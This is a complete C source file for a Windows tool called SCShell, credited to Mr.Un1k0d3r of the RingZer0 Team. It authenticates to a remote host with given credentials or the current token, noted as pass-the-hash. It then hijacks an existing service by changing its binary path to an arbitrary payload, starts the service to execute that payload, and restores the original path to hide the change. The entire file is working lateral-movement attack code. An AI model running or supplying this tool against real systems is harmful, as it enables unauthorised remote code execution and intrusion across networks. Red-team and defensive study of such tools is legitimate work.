// Author: Mr.Un1k0d3r RingZer0 Team

#include <Windows.h>
#include <stdio.h>

#define LOGON32_LOGON_NEW_CREDENTIALS 9

int main(int argc, char **argv) {
    CHAR* targetHost = argv[1];
    CHAR* serviceName = argv[2];
    CHAR* payload = argv[3];
    CHAR* domain = argv[4];
    CHAR* username = argv[5];
    CHAR* password = argv[6];
    LPQUERY_SERVICE_CONFIGA lpqsc = NULL;
    DWORD dwLpqscSize = 0;
    CHAR* originalBinaryPath = NULL;
    BOOL bResult = FALSE;

    printf("SCShell ***\n");
    if(argc < 3) {
        ExitProcess(0);
    }

    if(strcmp(targetHost,"local") == 0) {
        targetHost = NULL;
    } else {
        printf("Trying to connect to %s\n", targetHost);
    }

    HANDLE hToken = NULL;
    if(username != NULL) {
        printf("Username was provided attempting to call LogonUserA\n");
        bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
        if(!bResult) {
            printf("LogonUserA failed %ld\n", GetLastError());
            ExitProcess(0);
        }
    } else {
        printf("Using current process context for authentication. (Pass the hash)\n");
        if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
            printf("OpenProcessToken failed %ld\n", GetLastError());
            ExitProcess(0);
        }
    }

    bResult = FALSE;
    bResult = ImpersonateLoggedOnUser(hToken);
    if(!bResult) {
        printf("ImpersonateLoggedOnUser failed %ld\n", GetLastError());
        ExitProcess(0);
    }

    SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if(schManager == NULL) {
        printf("OpenSCManagerA failed %ld\n", GetLastError());
        ExitProcess(0);
    }
    printf("SC_HANDLE Manager 0x%p\n", schManager);

    printf("Opening %s\n", serviceName);
    SC_HANDLE schService = OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);
    if(schService == NULL) {
        CloseServiceHandle(schManager);
        printf("OpenServiceA failed %ld\n", GetLastError());
        ExitProcess(0);
    }
    printf("SC_HANDLE Service 0x%p\n", schService);

    DWORD dwSize = 0;
    QueryServiceConfigA(schService, NULL, 0, &dwSize);
    if(dwSize) {
        // This part is not critical error will not stop the program
        dwLpqscSize = dwSize;
        printf("LPQUERY_SERVICE_CONFIGA need 0x%08x bytes\n", dwLpqscSize);
        lpqsc = GlobalAlloc(GPTR, dwSize);
        bResult = FALSE;
        bResult = QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &dwSize);
        originalBinaryPath = lpqsc->lpBinaryPathName;
        printf("Original service binary path \"%s\"\n", originalBinaryPath);
    }

    bResult = FALSE;
    bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
    if(!bResult) {
        printf("ChangeServiceConfigA failed to update the service path. %ld\n", GetLastError());
        ExitProcess(0);
    }
    printf("Service path was changed to \"%s\"\n", payload);

    bResult = FALSE;
    bResult = StartServiceA(schService, 0, NULL);
    DWORD dwResult = GetLastError();
    if(!bResult && dwResult != 1053) {
        printf("StartServiceA failed to start the service. %ld\n", GetLastError());
    } else {
        printf("Service was started\n");
    }

    if(dwLpqscSize) {
        bResult = FALSE;
        bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
        if(!bResult) {
            printf("ChangeServiceConfigA failed to revert the service path. %ld\n", GetLastError());
            ExitProcess(0);
        }
        printf("Service path was restored to \"%s\"\n", originalBinaryPath);
    }
    
    GlobalFree(lpqsc);
    CloseHandle(hToken);
    CloseServiceHandle(schManager);
    CloseServiceHandle(schService);
    return 0;
}
